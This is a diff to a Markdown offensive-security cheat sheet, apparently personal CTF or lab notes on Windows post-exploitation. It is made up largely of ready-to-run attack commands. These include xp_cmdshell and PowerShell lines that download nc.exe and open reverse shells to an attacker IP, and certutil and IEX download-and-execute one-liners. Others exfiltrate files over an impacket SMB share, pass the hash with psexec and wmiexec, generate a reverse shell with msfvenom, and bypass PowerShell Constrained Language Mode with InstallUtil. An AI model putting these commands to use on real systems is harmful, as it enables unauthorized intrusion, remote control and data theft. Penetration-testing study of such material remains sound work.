@@ -20,7 +20,7 @@ SQL>
 
 2. execute commands
 
-    ```bash
+    ```powershell
     EXEC xp_cmdshell 'echo %cd%'
     xp_cmdshell powershell wget http://10.10.10.11:8000/nc.exe -OutFile %TEMP%\nc.exe
     xp_cmdshell powershell "%TEMP%\nc.exe -nv 10.10.10.11 443 -e cmd.exe
@@ -40,21 +40,21 @@ python psexec.py <user>@10.10.10.10
 
 **certutil.exe** is a netcat variant for Windows. It can be use for download files form the internet like a wget tool
 
-```bash
+```powershell
 certutil.exe -f -urlcache -split http://10.10.10.10/chisel.exe C:\Windows\temp
 ```
 
 ### Download files by using Powershell {-}
 
-```bash
+```powershell
 powershell -c iwr -uri http://<attacker_ip>/<file_to_download> -OutFile C:\Windows\Temp\nc.exe
 ```
 
-```bash
+```powershell
 powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/<file_to_download_and_execute')
 ```
 
-### Share SMB directory to Windows Machine {-}
+### Share SMB directory with Windows Machine {-}
 
 Imaging we want to execute nc.exe on the Windows machine but this one don't have **nc.exe**. We can download nc.exe and execute
 it by sharing a SMB folder.
@@ -67,8 +67,45 @@ it by sharing a SMB folder.
 
 1. On windows machine
 
-    ```bash
+    ```powershell
     \\10.10.10.10\smbFolder\nc.exe -e cmd 10.10.10.10 443
+    ```
+
+Share SMB can also be usefull to send files from the victim to the attacker machine. Imagine now that we want to retrieve file.txt
+from the victim to the attacker machine.
+
+1. On attacker machine
+
+    ```bash
+    impacket-smbserver smbFolder $(pwd) -smb2support
+    ```
+
+1. On windows machine
+
+    ```powershell
+    copy file.txt \\10.10.10.11\smbFolder\file.txt
+    ```
+
+
+It can appear that this technic will not work because of `ERROR: The specified server cannot perform the requested operation.` error.
+The solution here will be to assign a user and password for this share resource.
+
+1. On attacker machine
+
+    ```bash
+    impacket-smbserver smbFolder $(pwd) smb2support -username looping -password looping
+    ```
+
+1. On victim machine, create a logical unit binded to this shared resource
+
+    ```powershell
+    net use x: \\10.10.10.11\smbFolder /user:looping looping
+    ```
+
+1. You can then copy the desired file directly into x: logical unit
+
+    ```powershell
+    copy file.txt x:\file.txt
     ```
 
 ## Connection throw WinRM with evil-winrm {-}
@@ -77,7 +114,7 @@ If you have user credentials and the machine have port 5985 or WinRM running in 
 with **evil-winrm** tool
 
 1. Install evil-winrm
-neo
+
     ```bash
     sudo gem install evil-winrm
     ```
@@ -85,7 +122,13 @@ neo
 1. Connect with evil-winrm
 
     ```bash
-    evil-winrm -i 10.10.10.10 -u username -p Password1234
+    evil-winrm -i 10.10.10.10 -u 'username' -p 'Password1234'
+    ```
+
+1. Connect by ssl
+
+    ```bash
+    evil-winrm -S -c certnew.cer -k private.key -i 10.10.10.10 -u 'username' -p 'Password1234'
     ```
 
 ## Exploit GetChangesAll privilege vulnerability {-}
@@ -110,6 +153,12 @@ You can then connect to the victim machine by using psexec.py
 
 ```bash
 psexec.py domain.name/administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```
+
+You can also use the impacket-wmiexec to connect to the victim machine.
+
+```bash
+impacket-wmiexec domain.name/administrator@10.10.10.10 -hashes :8a4b77d52b1845bfe949ed1b9643bb18
 ```
 
 ## Powershell access with Nishang {-}
@@ -143,6 +192,49 @@ Script that send a reverse shell with powershell on TCP protocol.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe 
 ```
 
+## Bypass Constraint Language in a PowerShell {-}
+
+It's possible that sometimes, when you gain access to a windows machine and you have a PowerShell, that this is on
+**constraint language** context. In the victim machine, you can check that with the `$ExecutionContext.SessionState.LanguageMode`
+command.
+
+With the use of [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM), by creating
+a new reverse shell, you can bypass this context.
+
+1. clone the PSByPassCLM repository
+
+    ```bash
+    git clone https://github.com/padovah4ck/PSByPassCLM
+    ```
+
+1. Transfer PSByPassCLM.exe to the victim machine
+
+    - on the attacker machine
+
+        ```bash
+        cd PSByPassCLM/PSByPassCLM/PSBypassCLM/bin/x64/Debug
+        python -m http.server 80
+        ```
+    - on the victim machine
+
+        ```powershell
+        iwr -uri http://10.10.10.11/PsByPassCLM.exe -OutFile c:\temp\psby.exe
+        ```
+
+1. Create the reverse connection
+
+    - on the attacker machine
+
+        ```bash
+        rlwrap nc -nlvp 443
+        ```
+    - on the victim machine
+
+        ```powershell
+        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.10.11 /rport=443 /U c:\temp\psby.exe
+        ```
+
+In the new shell session, if you write the `$ExecutionContext.SessionState.LanguageMode`, you will be able to check if now you are in a **FullLanguage** context.
 
 
 ## Shells for windows {-}
